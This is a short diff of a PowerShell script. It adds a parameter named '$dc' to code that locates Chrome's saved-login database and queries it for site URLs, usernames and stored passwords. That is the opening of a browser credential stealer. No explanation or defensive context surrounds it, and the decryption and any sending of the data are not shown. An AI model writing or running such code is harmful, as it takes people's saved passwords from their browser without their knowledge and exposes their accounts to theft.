@@ -1,3 +1,7 @@
+param (
+    [string]$dc
+)
+
 $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
 $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
